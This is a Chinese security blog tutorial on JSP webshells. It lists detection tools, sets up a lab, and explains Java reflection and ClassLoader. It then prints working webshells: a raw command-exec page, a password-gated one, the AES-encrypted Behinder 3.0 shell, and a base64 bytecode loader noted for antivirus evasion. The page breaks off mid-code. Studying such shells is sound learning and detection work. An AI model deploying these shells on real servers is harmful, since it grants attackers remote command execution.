@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ShangZeng">
+
+
+
+
+
+<title>从零开始学习webshell-jsp | ShangZeng</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">ShangZeng&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/friends">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">ShangZeng&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/friends">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">从零开始学习webshell-jsp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">ShangZeng</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 16, 2020&nbsp;&nbsp;10:38:27</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/other/">other</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="常见webshell查杀工具"><a href="#常见webshell查杀工具" class="headerlink" title="常见webshell查杀工具"></a>常见webshell查杀工具</h2><table>
+<thead>
+<tr>
+<th>工具名</th>
+<th>下载网址</th>
+<th>在线查杀网址</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>D盾</td>
+<td><a href="http://www.d99net.com/" target="_blank" rel="noopener">http://www.d99net.com/</a></td>
+<td></td>
+<td>常见查杀工具</td>
+</tr>
+<tr>
+<td>WEBDIR+百度WebShell扫描检测引擎</td>
+<td></td>
+<td><a href="https://scanner.baidu.com/#/pages/intro" target="_blank" rel="noopener">https://scanner.baidu.com/#/pages/intro</a></td>
+<td>效果比较好</td>
+</tr>
+<tr>
+<td>WebShellkiller</td>
+<td><a href="https://edr.sangfor.com.cn/" target="_blank" rel="noopener">https://edr.sangfor.com.cn/</a></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>WEBSHELL.PUB 专注查杀</td>
+<td><a href="http://dl.shellpub.com" target="_blank" rel="noopener">http://dl.shellpub.com</a></td>
+<td><a href="https://n.shellpub.com/" target="_blank" rel="noopener">https://n.shellpub.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="IDEA-搭建jsp实验环境"><a href="#IDEA-搭建jsp实验环境" class="headerlink" title="IDEA 搭建jsp实验环境"></a>IDEA 搭建jsp实验环境</h2><p>下载<a href="https://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">tomcat</a>，打开IDEA:<br><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/1.png" alt="image"></p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/2.png" alt="image"></p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/3.png" alt="image"></p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/4.png" alt="image"></p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/5.png" alt="image"></p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/6.png" alt="image"></p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/7.png" alt="image"></p>
+<h2 id="jsp-webshell-知识点"><a href="#jsp-webshell-知识点" class="headerlink" title="jsp webshell 知识点"></a>jsp webshell 知识点</h2><p>在学习jsp webshell 的时候，会遇到以下知识点，不理解的话对新人来说很难进行下去。</p>
+<h3 id="关于-jsp-标签"><a href="#关于-jsp-标签" class="headerlink" title="关于 jsp 标签"></a>关于 jsp 标签</h3><p>更多的标签可以在<a href="https://wiki.jikexueyuan.com/project/jsp/syntax.html" target="_blank" rel="noopener">这里</a>进行查看。这里列出一些常见的。</p>
+<table>
+<thead>
+<tr>
+<th>jsp标签名字</th>
+<th>使用方式</th>
+<th>简介</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>核心标签库</td>
+<td>&lt;%@ taglib prefix=”c” uri=”<a href="http://java.sun.com/jsp/jstl/core&quot;" target="_blank" rel="noopener">http://java.sun.com/jsp/jstl/core&quot;</a> %&gt;</td>
+<td>JSP 页面中引入核心标签库时需要使用</td>
+</tr>
+<tr>
+<td>格式标签库</td>
+<td>&lt;%@ taglib prefix=”fmt” uri=”<a href="http://java.sun.com/jsp/jstl/fmt&quot;" target="_blank" rel="noopener">http://java.sun.com/jsp/jstl/fmt&quot;</a> %&gt;</td>
+<td>格式标签库是用于格式化和显示国际化网址的文本、日期、时间和数字</td>
+</tr>
+<tr>
+<td>jsp注释</td>
+<td>&lt;%–dddddddddd–%&gt;</td>
+<td>用于注释jsp和html</td>
+</tr>
+<tr>
+<td>scriptlet</td>
+<td>&lt;% out.println(“Your IP address is “ + request.getRemoteAddr());%&gt;</td>
+<td>scriptlet 可以包含任意数量的 JAVA 语言语句，变量或方法声明，或者在页面的脚本语言中有效的表达式。</td>
+</tr>
+<tr>
+<td>JSP 声明</td>
+<td>&lt;%! int i = 0; %&gt;</td>
+<td>JSP 声明声明了一个或多个变量或方法，你可以在 JSP 文件中的 Java 代码中使用。当你在 JSP 文件中使用变量或方法之前，你必须声明。</td>
+</tr>
+</tbody></table>
+<h3 id="关于-Java-类反射"><a href="#关于-Java-类反射" class="headerlink" title="关于 Java 类反射"></a>关于 Java 类反射</h3><p>类反射是指将类的各个组成部分封装成为其他对象，这就是反射机制。</p>
+<ol>
+<li>反射可以让我们在程序的运行当中操作对象（主要是在框架中使用）</li>
+<li>可以结偶，提高程序的可扩展性</li>
+</ol>
+<p>获取class类名的方式</p>
+<ol>
+<li>Class.forName(“全类名”)；//将字节码文件（.class）加载进入内存,返回class对象。</li>
+<li>类名.class: 通过类名属性的class来获取</li>
+<li>对象.getClass(); getClass()方法在Object中进行定义</li>
+</ol>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/8.png" alt="image"></p>
+<p>更具体的可以看<a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html" target="_blank" rel="noopener">大白话说Java反射：入门、使用、原理</a>，这个讲的很棒。</p>
+<h3 id="关于-Java-的-ClassLoader-（类加载）"><a href="#关于-Java-的-ClassLoader-（类加载）" class="headerlink" title="关于 Java 的 ClassLoader （类加载）"></a>关于 Java 的 ClassLoader （类加载）</h3><p>看这个：</p>
+<ol>
+<li><a href="https://blog.csdn.net/briblue/article/details/54973413" target="_blank" rel="noopener">一看你就懂，超详细java中的ClassLoader详解</a></li>
+<li><a href="https://www.cnblogs.com/mybatis/p/9396135.html" target="_blank" rel="noopener">深入理解Java类加载器(ClassLoader)</a></li>
+</ol>
+<h3 id="关于-Java-的构造方法"><a href="#关于-Java-的构造方法" class="headerlink" title="关于 Java 的构造方法"></a>关于 Java 的构造方法</h3><p>在一个类中定义的方法如果同时满足以下三个条件，该方法称为<a href="https://www.cnblogs.com/zhengchujie/p/11729927.html" target="_blank" rel="noopener">构造方法</a>，具有如下：</p>
+<ol>
+<li>方法与类名相同。</li>
+<li>在方法名的前面没有返回值类型的声明。</li>
+<li>在方法中不能使用return语句返回一个值</li>
+</ol>
+<h3 id="关于-Java-的-加密方式"><a href="#关于-Java-的-加密方式" class="headerlink" title="关于 Java 的 加密方式"></a>关于 Java 的 加密方式</h3><ol>
+<li><a href="https://www.cnblogs.com/caizhaokai/p/10944667.html" target="_blank" rel="noopener">Java使用Cipher类实现加密，包括DES，DES3，AES和RSA加密</a></li>
+</ol>
+<h3 id="关于-Java-的重写与重载"><a href="#关于-Java-的重写与重载" class="headerlink" title="关于 Java 的重写与重载"></a>关于 Java 的重写与重载</h3><ol>
+<li><a href="https://www.runoob.com/java/java-override-overload.html" target="_blank" rel="noopener">Java 重写(Override)与重载(Overload)</a></li>
+</ol>
+<h3 id="关于-Java-的-super-的使用"><a href="#关于-Java-的-super-的使用" class="headerlink" title="关于 Java 的 super() 的使用"></a>关于 Java 的 super() 的使用</h3><ol>
+<li><a href="https://blog.csdn.net/yongbutingxide/article/details/82669054" target="_blank" rel="noopener">Java中super()的使用</a></li>
+</ol>
+<h3 id="关于-Java-动态解析二进制class文件"><a href="#关于-Java-动态解析二进制class文件" class="headerlink" title="关于 Java 动态解析二进制class文件"></a>关于 Java 动态解析二进制class文件</h3><p>简单理解，就是在上图片中的class加载阶段，加载我们才事先写好的二进制class文件（在目前服务器阶段，实现了类似PHP代码中的<em>eval</em>效果），从而达到任意代码执行的目的（而且因为class文件是二进制形式，因此也有一定的免杀效果）。这里实验如下：</p>
+<ol>
+<li>首先编译一个我们打算执行的class文件，代码如下(MAC不知道怎么弹计算器，就用命令执行代替了)：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package calc;</span><br><span class="line"></span><br><span class="line">import java.util.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class classTest &#123;</span><br><span class="line">    @Override</span><br><span class="line">    &#x2F;&#x2F;验证@Override下面的方法名是否是你父类中所有的，如果没有则报错。</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 执行命令whoami ,否则返回error</span><br><span class="line">            Process p &#x3D; Runtime.getRuntime().exec(&quot;whoami&quot;);</span><br><span class="line">            InputStream in &#x3D; p.getInputStream();</span><br><span class="line">            DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">            String disr &#x3D; dis.readLine();</span><br><span class="line">            return disr;</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意，使用javac进行编译的话可能会因为编译器版本不同报错，这里建议还是使用IDEA自动编译并计算base64值：</p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/9.png" alt="image"></p>
+<p>写主函数对编译好的bases64代码解密并加载class文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package calc;</span><br><span class="line"></span><br><span class="line">import sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static class Myloader extends ClassLoader &#x2F;&#x2F;继承ClassLoader</span><br><span class="line">    &#123;</span><br><span class="line">        public  Class get(byte[] b)</span><br><span class="line">        &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F;String classStr&#x3D;&quot;&quot;; &#x2F;&#x2F; class的base64编码</span><br><span class="line">        String classStr&#x3D;&quot;yv66vgAAADQAPwoADQAlCgAmACcIACgKACYAKQoAKgArBwAsCgAGAC0KAAYALgcALwoACQAwCAAxBwAyBwAzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABBMY2FsYy9jbGFzc1Rlc3Q7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANkaXMBABlMamF2YS9pby9EYXRhSW5wdXRTdHJlYW07AQAEZGlzcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAvAQAKU291cmNlRmlsZQEADmNsYXNzVGVzdC5qYXZhDAAOAA8HADQMADUANgEABndob2FtaQwANwA4BwA5DAA6ADsBABdqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbQwADgA8DAA9ABYBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA+AA8BAAVlcnJvcgEADmNhbGMvY2xhc3NUZXN0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAhyZWFkTGluZQEAD3ByaW50U3RhY2tUcmFjZQAhAAwADQAAAAAAAgABAA4ADwABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAAYAEgAAAAwAAQAAAAUAEwAUAAAAAQAVABYAAQAQAAAAtAADAAUAAAAouAACEgO2AARMK7YABU27AAZZLLcAB04ttgAIOgQZBLBMK7YAChILsAABAAAAHwAgAAkAAwARAAAAIgAIAAAACwAJAAwADgANABcADgAdAA8AIAAQACEAEQAlABMAEgAAAD4ABgAJABcAFwAYAAEADgASABkAGgACABcACQAbABwAAwAdAAMAHQAeAAQAIQAEAB8AIAABAAAAKAATABQAAAAhAAAABgABYAcAIgABACMAAAACACQ&#x3D;&quot;; &#x2F;&#x2F; class的base64编码</span><br><span class="line">        BASE64Decoder code&#x3D;new sun.misc.BASE64Decoder();</span><br><span class="line">        Class result&#x3D;new Myloader().get(code.decodeBuffer(classStr));&#x2F;&#x2F;将base64解码成byte数组，并传入t类的get函数</span><br><span class="line">        System.out.println(result.newInstance().toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行，class文件执行：</p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/10.png" alt="image"></p>
+<h2 id="java-webshell-解析"><a href="#java-webshell-解析" class="headerlink" title="java webshell 解析"></a>java webshell 解析</h2><p>这里列举了一些常见的webshell，并在注释中进行简单分析。</p>
+<h3 id="命令执行类webshell"><a href="#命令执行类webshell" class="headerlink" title="命令执行类webshell"></a>命令执行类webshell</h3><p>在Java中没有类似PHP中那种代码执行的参数，因此命令之行类shell比较常见，目前最常见的是调用<strong>Runtime.getRuntime().exec()</strong>和****这两个函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;</span><br><span class="line">        &#x2F;&#x2F;判断是get请求cmd</span><br><span class="line">        out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;);</span><br><span class="line">        &#x2F;&#x2F; 输出命令页面</span><br><span class="line">        Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">        &#x2F;&#x2F;Runtime.getRuntime().exec()  命令执行</span><br><span class="line">        &#x2F;&#x2F;request.getParameter(&quot;cmd&quot;)  接受的get</span><br><span class="line">        &#x2F;&#x2F;Process     进程管理对象</span><br><span class="line">        &#x2F;&#x2F;Runtime.exec 方法创建一个本机进程，并返回 Process 子类的一个实例，该实例可用来控制进程并获得相关信息。Process 类提供了执行从进程输入、执行输出到进程、等待进程完成、检查进程的退出状态以及销毁（杀掉）进程的方法。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">        &#x2F;&#x2F; 字节输出流</span><br><span class="line">        InputStream in &#x3D; p.getInputStream();</span><br><span class="line">        &#x2F;&#x2F; 字节输入流</span><br><span class="line">        DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;BufferedReader d &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        &#x2F;&#x2F; BufferedReader 字符缓冲输入流</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 数据输入流允许应用程序以与机器无关方式从底层输入流中读取基本 Java 数据类型。</span><br><span class="line">        String disr &#x3D; dis.readLine();</span><br><span class="line">        &#x2F;&#x2F;readLine() 读取一行数据，遇到回车后停止</span><br><span class="line"></span><br><span class="line">        while ( disr !&#x3D; null ) &#123;</span><br><span class="line">            &#x2F;&#x2F;disr &#x3D; dis.readLine();</span><br><span class="line">            out.println(disr);</span><br><span class="line">            &#x2F;&#x2F;判断返回内容，如果有就输出</span><br><span class="line">            disr &#x3D; dis.readLine();</span><br><span class="line">            &#x2F;&#x2F; 这里是一行一行的读取数据</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>具体效果如下</p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/11.png" alt="image"></p>
+<p>在结构上进行了一定的优化后如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">    &#x2F;&#x2F; webShell.jsp?pwd&#x3D;023  密码验证</span><br><span class="line">    java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">    &#x2F;&#x2F; 原理同上面那个例子，只不过这里整合了</span><br><span class="line">    int a &#x3D; -1;</span><br><span class="line">    byte[] b &#x3D; new byte[2048];  &#x2F;&#x2F; 创建byte数组</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">        &#x2F;&#x2F;java.io.InputStream read() 在读取完事后会返回 -1</span><br><span class="line">        out.println(new String(b,0,a));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>具体效果如下：</p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/12.png" alt="image"></p>
+<h3 id="基于冰蝎3-0的-jsp-webshell"><a href="#基于冰蝎3-0的-jsp-webshell" class="headerlink" title="基于冰蝎3.0的 jsp webshell"></a>基于冰蝎3.0的 jsp webshell</h3><p>原理可以看作者<a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">写的文章</a>，这里我自己进行拆分理解，在冰蝎3.0中自带的jspwebshell如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k&#x3D;&quot;e45e329feb5d925b&quot;;&#x2F;*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*&#x2F;session.putValue(&quot;u&quot;,k);Cipher c&#x3D;Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>具体效果如下：</p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/13.png" alt="image"></p>
+<p>我们进行简单的分化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!class U extends ClassLoader&#123;</span><br><span class="line">    &#x2F;&#x2F; 继承ClassLoader 类（类加载器）</span><br><span class="line"></span><br><span class="line">    U(ClassLoader c)&#123;</span><br><span class="line">        &#x2F;&#x2F;使用构造方法 super() 子类重写父类</span><br><span class="line">        &#x2F;&#x2F;不理解可以看这个 https:&#x2F;&#x2F;blog.csdn.net&#x2F;yongbutingxide&#x2F;article&#x2F;details&#x2F;82669054</span><br><span class="line">        super(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Class g(byte []b)&#123;</span><br><span class="line">        return super.defineClass(b,0,b.length);</span><br><span class="line">        &#x2F;&#x2F; 使用super调用父类ClassLoader 的defineClass，加载二进制的class文件</span><br><span class="line">    &#125;</span><br><span class="line">&#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%if 